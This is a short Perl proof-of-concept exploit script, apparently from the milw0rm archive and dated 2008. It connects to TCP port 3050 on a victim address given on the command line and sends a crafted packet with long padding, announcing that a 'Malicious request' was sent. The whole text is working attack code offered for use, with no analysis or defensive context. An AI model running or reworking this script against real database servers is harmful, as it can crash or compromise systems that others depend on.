###############################################################################################################
#                                 POC.pl                                                                   #
###############################################################################################################
#!/usr/bin/perl -w
#Author:  Liu Zhen Hua <alau [at] 163.com>

use IO::Socket;
use strict;
my $host=$ARGV[0];
sub usage {
print "usage: perl poc.pl serverip\n";
}
if ($#ARGV < 0) {
usage();
exit();
}
my $victim = IO::Socket::INET->new(Proto=>'tcp',
                                PeerAddr=>$host,
                                PeerPort=>3050);
my $pad0 = "\x41"x1000;       #"\x00\x00\x03\xE8"
my $pad5 = "\x43"x16;
my $exploit = "\x00\x00\x00\x52\xFF\xFF\xFF\xFF\x00\x00\x03\xE8".$pad0."\x00\x00\x00\x10".$pad5;
print $victim $exploit ;
print " + Malicious  request sent ...\n";
sleep(1);
print "Done.\n";
close($victim);
exit;

# milw0rm.com [2008-04-11]
